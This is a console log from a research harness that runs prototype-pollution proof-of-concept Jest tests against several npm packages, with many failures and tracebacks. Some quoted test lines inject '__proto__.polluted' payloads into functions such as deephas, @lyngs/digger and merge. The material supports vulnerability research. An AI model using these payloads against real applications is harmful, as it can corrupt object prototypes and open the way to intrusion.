      at Object.<anonymous> (cookiex-deep_0.0.6/cookiex-deep.test.js:6:3)

  ● prototype pollution in @cookiex/deep

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        0.938 s
Ran all test suites matching /cookiex-deep_0.0.6\/cookiex-deep.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'cookiex-deep_0.0.6/cookiex-deep.test.js']' returned non-zero exit status 1.
['../prototype-pollution/properties-reader_2.0.0/properties-reader.test.js']
PASS properties-reader_2.0.0/properties-reader.test.js
  ✓ prototype pollution in properties-reader (114 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        0.987 s
Ran all test suites matching /properties-reader_2.0.0\/properties-reader.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 7\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/node-extend_1.0.0/node-extend.test.js']
PASS node-extend_1.0.0/node-extend.test.js
  ✓ prototype pollution in node.extend  (60 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        0.952 s
Ran all test suites matching /node-extend_1.0.0\/node-extend.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'version', 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 5, 3\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/aurelia-path_1.1.7/aurelia-path.test.js']
PASS aurelia-path_1.1.7/aurelia-path.test.js
  ✓ prototype pollution in aurelia-path (89 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.267 s
Ran all test suites matching /aurelia-path_1.1.7\/aurelia-path.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'relativeToFile', 'join', 'buildQueryString', 'parseQueryString' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'parseQueryString' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 2, 3\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/deep-set_1.0.0/deep-set.test.js']
PASS deep-set_1.0.0/deep-set.test.js
  ✓ prototype pollution in deep-set (54 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        0.922 s
Ran all test suites matching /deep-set_1.0.0\/deep-set.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 3\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/vega-util_1.13.0/vega-util.test.js']
FAIL vega-util_1.13.0/vega-util.test.js
  ✕ prototype pollution in vega-util (114 ms)

  ● prototype pollution in vega-util

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/node_modules/vega-util/build/vega-util.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitSingle (../node_modules/@babel/traverse/lib/context.js:77:19)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:131:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● prototype pollution in vega-util

    TypeError: util.mergeConfig is not a function

       8 |   expect({}.polluted).toBe(undefined);
       9 | 
    > 10 |   util.mergeConfig(config, JSON.parse(malicious_payload));
         |        ^
      11 | 
      12 |   expect({}.polluted).toBe("yes");
      13 | });

      at Object.<anonymous> (vega-util_1.13.0/vega-util.test.js:10:8)

  ● prototype pollution in vega-util

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.003 s
Ran all test suites matching /vega-util_1.13.0\/vega-util.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'vega-util_1.13.0/vega-util.test.js']' returned non-zero exit status 1.
['../prototype-pollution/think-config_1.0.0/poc.test.js']
PASS think-config_1.0.0/poc.test.js
  ✓ prototype pollution in x-assign (298 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.302 s
Ran all test suites matching /think-config_1.0.0\/poc.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(2) { 'main', 'prototype' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 20, 3\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/just-extend_3.0.0/just-extend.test.js']
PASS just-extend_3.0.0/just-extend.test.js
  ✓ prototype pollution in just-extend  (53 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.105 s
Ran all test suites matching /just-extend_3.0.0\/just-extend.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 3\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/nedb_1.8.0/nedb.test.js']
FAIL nedb_1.8.0/nedb.test.js
  ✕ prototype pollution in nedb (391 ms)

  ● prototype pollution in nedb

    TypeError: Cannot read properties of undefined (reading '_')

      26 |         if (fs.existsSync(prefixed))
      27 |             currMod = prefixed;
    > 28 |         let result = jest.requireActual(currMod);
         |                           ^
      29 |         global.accessedProperties = new Set();
      30 |         global.declaredProperties = Object.keys(result);    
      31 |         

      at call (node_modules/underscore/underscore.js:15:33)
      at Object.<anonymous> (node_modules/underscore/underscore.js:1226:4)
      at Object.<anonymous> (node_modules/nedb/lib/model.js:9:9)
      at Object.<anonymous> (node_modules/nedb/lib/datastore.js:2:13)
      at Object.<anonymous> (node_modules/nedb/index.js:1:17)
      at Object.<anonymous> (require-interception.js:28:27)

  ● prototype pollution in nedb

    TypeError: Datastore is not a constructor

      2 | test("prototype pollution in nedb", () => {
      3 |   const Datastore = require("nedb");
    > 4 |   const db = new Datastore();
        |              ^
      5 | 
      6 |   expect({}.polluted).toBe(undefined);
      7 | 

      at Object.<anonymous> (nedb_1.8.0/nedb.test.js:4:14)

  ● prototype pollution in nedb

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.311 s
Ran all test suites matching /nedb_1.8.0\/nedb.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'nedb_1.8.0/nedb.test.js']' returned non-zero exit status 1.
['../prototype-pollution/fabiocaccamo-utils.js_0.17.0/fabiocaccamo-utils.test.js']
PASS fabiocaccamo-utils.js_0.17.0/fabiocaccamo-utils.test.js
  ✓ prototype pollution in @fabiocaccamo/utils.js (370 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.22 s
Ran all test suites matching /fabiocaccamo-utils.js_0.17.0\/fabiocaccamo-utils.test.js/i.
b"Loaded babel plugin\n  console.log\n    [\n      'array',  'base64', 'color',\n      'date',   'ease',   'func',\n      'geom',   'hex',    'json',\n      'math',   'number', 'object',\n      'random', 'string', 'test',\n      'trigo',  'type',   'xml',\n      'url',    'utf8'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'object' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 0, 2\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/deephas_1.0.5/deephas.test.js']
FAIL deephas_1.0.5/deephas.test.js
  ✕ prototype pollution in deephas  (160 ms)

  ● prototype pollution in deephas 

    SyntaxError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/node_modules/deephas/deepHas.js: Identifier 'indexer' has already been declared. (10:9)

       8 |     set;
       9 |
    > 10 | function indexer(set) {
         |          ^
      11 |     return function(obj, i) {
      12 |         "use strict";
      13 |         try {

      at Parser._raise (../node_modules/@babel/parser/src/parser/error.js:150:45)
      at Parser.raiseWithData (../node_modules/@babel/parser/src/parser/error.js:145:17)
      at Parser.raise (../node_modules/@babel/parser/src/parser/error.js:89:17)
      at ScopeHandler.checkRedeclarationInScope (../node_modules/@babel/parser/src/util/scope.js:152:12)
      at ScopeHandler.declareName (../node_modules/@babel/parser/src/util/scope.js:113:12)
      at Parser.registerFunctionStatementId (../node_modules/@babel/parser/src/parser/statement.js:1344:16)
      at Parser.parseFunction (../node_modules/@babel/parser/src/parser/statement.js:1311:12)
      at Parser.parseFunctionStatement (../node_modules/@babel/parser/src/parser/statement.js:749:17)
      at Parser.parseStatementContent (../node_modules/@babel/parser/src/parser/statement.js:366:21)
      at Parser.parseStatement (../node_modules/@babel/parser/src/parser/statement.js:329:17)

  ● prototype pollution in deephas 

    TypeError: dh.set is not a function

       5 |   const dh = require("deephas");
       6 |   let obj = {};
    >  7 |   dh.set(obj, "__proto__.polluted", "yes");
         |      ^
       8 | 
       9 |   expect(obj.polluted).toBe("yes");
      10 | });

      at Object.<anonymous> (deephas_1.0.5/deephas.test.js:7:6)

  ● prototype pollution in deephas 

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.05 s
Ran all test suites matching /deephas_1.0.5\/deephas.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'deephas_1.0.5/deephas.test.js']' returned non-zero exit status 1.
['../prototype-pollution/inireader_1.0.0/inireader.test.js']
PASS inireader_1.0.0/inireader.test.js
  ✓ prototype pollution in inireader (114 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        0.974 s
Ran all test suites matching /inireader_1.0.0\/inireader.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'IniReader' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'IniReader' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 3\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/object-path_0.11.0/object-path.test.js']
PASS object-path_0.11.0/object-path.test.js
  ✓ prototype pollution in object-path (107 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.09 s
Ran all test suites matching /object-path_0.11.0\/object-path.test.js/i.
b"Loaded babel plugin\n  console.log\n    [\n      'has',\n      'ensureExists',\n      'set',\n      'insert',\n      'empty',\n      'push',\n      'coalesce',\n      'get',\n      'del',\n      'create',\n      'withInheritedProps'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(0) {}\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: -1, 2\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/set-object-value_0.0.5/set-object-value.test.js']
FAIL set-object-value_0.0.5/set-object-value.test.js
  ✕ prototype pollution in setObjectValue (34 ms)

  ● prototype pollution in setObjectValue

    ReferenceError: obj is not defined

      2 | test("prototype pollution in setObjectValue", () => {
      3 |   var setObjectValue = require("set-object-value");
    > 4 |   obj = {};
        |      ^
      5 | 
      6 |   expect({}.polluted).toBe(undefined);
      7 | 

      at Object.<anonymous> (set-object-value_0.0.5/set-object-value.test.js:4:6)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        0.908 s
Ran all test suites matching /set-object-value_0.0.5\/set-object-value.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'set-object-value_0.0.5/set-object-value.test.js']' returned non-zero exit status 1.
['../prototype-pollution/lyngs-digger_1.0.7/lyngs-digger.test.js']
FAIL lyngs-digger_1.0.7/lyngs-digger.test.js
  ✕ prototype pollution in @lyngs/digge (331 ms)

  ● prototype pollution in @lyngs/digge

    TypeError: pushFct(...) is not a function

      26 |         if (fs.existsSync(prefixed))
      27 |             currMod = prefixed;
    > 28 |         let result = jest.requireActual(currMod);
         |                           ^
      29 |         global.accessedProperties = new Set();
      30 |         global.declaredProperties = Object.keys(result);    
      31 |         

      at fn (node_modules/@lyngs/digger/dist/index.js:225:2)
      at createCommonjsModule (node_modules/@lyngs/digger/dist/index.js:16:6)
      at factory (node_modules/@lyngs/digger/dist/index.js:224:15)
      at node_modules/@lyngs/digger/dist/index.js:2:65
      at Object.<anonymous> (node_modules/@lyngs/digger/dist/index.js:1:2)
      at Object.<anonymous> (require-interception.js:28:27)

  ● prototype pollution in @lyngs/digge

    TypeError: digger is not a function

      3 |   const { digger } = require("@lyngs/digger");
      4 |   expect({}.polluted).toBe(undefined);
    > 5 |   digger({}, "__proto__.polluted", "yes", { extend: true });
        |   ^
      6 |   expect({}.polluted).toBe("yes");
      7 | });
      8 | 

      at Object.<anonymous> (lyngs-digger_1.0.7/lyngs-digger.test.js:5:3)

  ● prototype pollution in @lyngs/digge

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.192 s
Ran all test suites matching /lyngs-digger_1.0.7\/lyngs-digger.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'lyngs-digger_1.0.7/lyngs-digger.test.js']' returned non-zero exit status 1.
['../prototype-pollution/convict_6.0.0/convict.test.js']
FAIL convict_6.0.0/convict.test.js
  ✕ prototype pollution in node-dig (189 ms)

  ● prototype pollution in node-dig

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/node_modules/convict/node_modules/yargs-parser/index.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitMultiple (../node_modules/@babel/traverse/lib/context.js:72:17)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:129:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● prototype pollution in node-dig

    TypeError: convict is not a function

      3 |   const convict = require("convict");
      4 |   let obj = {};
    > 5 |   const config = convict(obj);
        |                  ^
      6 | 
      7 |   expect({}.polluted).toBe(undefined);
      8 | 

      at Object.<anonymous> (convict_6.0.0/convict.test.js:5:18)

  ● prototype pollution in node-dig

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.041 s
Ran all test suites matching /convict_6.0.0\/convict.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'convict_6.0.0/convict.test.js']' returned non-zero exit status 1.
['../prototype-pollution/node-dig_1.0.1/node-dig.test.js']
PASS node-dig_1.0.1/node-dig.test.js
  ✓ prototype pollution in node-dig (37 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        0.895 s
Ran all test suites matching /node-dig_1.0.1\/node-dig.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 1\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/just-safe-set_1.0.0/just-safe-set.test.js']
PASS just-safe-set_1.0.0/just-safe-set.test.js
  ✓ prototype pollution in just-safe-set (31 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        0.916 s
Ran all test suites matching /just-safe-set_1.0.0\/just-safe-set.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 1\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/jsonpointer_4.0.0/jsonpointer.test.js']
PASS jsonpointer_4.0.0/jsonpointer.test.js
  ✓ prototype pollution in jsonpointer (56 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        0.948 s
Ran all test suites matching /jsonpointer_4.0.0\/jsonpointer.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'get', 'set', 'compile' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'set' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 3, 2\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/style-dictionary_2.10.2/style-dictionary.test.js']
FAIL style-dictionary_2.10.2/style-dictionary.test.js
  ✕ prototype pollution in style-dictionary (75 ms)

  ● prototype pollution in style-dictionary

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/node_modules/chalk/source/index.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitSingle (../node_modules/@babel/traverse/lib/context.js:77:19)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:131:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● prototype pollution in style-dictionary

    TypeError: StyleDictionary.extend is not a function

       7 |   expect({}.polluted).toBe(undefined);
       8 | 
    >  9 |   StyleDictionary.extend(opts);
         |                   ^
      10 |   expect({}.polluted).toBe("yes");
      11 | });
      12 | 

      at Object.<anonymous> (style-dictionary_2.10.2/style-dictionary.test.js:9:19)

  ● prototype pollution in style-dictionary

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.2 s
Ran all test suites matching /style-dictionary_2.10.2\/style-dictionary.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'style-dictionary_2.10.2/style-dictionary.test.js']' returned non-zero exit status 1.
['../prototype-pollution/brikcss-merge_1.3.0/@brikcss-merge.test.js']
FAIL brikcss-merge_1.3.0/@brikcss-merge.test.js
  ✕ prototype pollution in @brikcss/merge (36 ms)

  ● prototype pollution in @brikcss/merge

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/node_modules/@brikcss/merge/dist/lib/merge.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitMultiple (../node_modules/@babel/traverse/lib/context.js:72:17)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:129:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● prototype pollution in @brikcss/merge

    TypeError: merge is not a function

       7 |   expect({}.polluted).toBe(undefined);
       8 | 
    >  9 |   merge({}, JSON.parse(malicious_payload));
         |   ^
      10 |   expect({}.polluted).toBe("yes");
      11 | });
      12 | 

      at Object.<anonymous> (brikcss-merge_1.3.0/@brikcss-merge.test.js:9:3)

  ● prototype pollution in @brikcss/merge

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        0.911 s
Ran all test suites matching /brikcss-merge_1.3.0\/@brikcss-merge.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
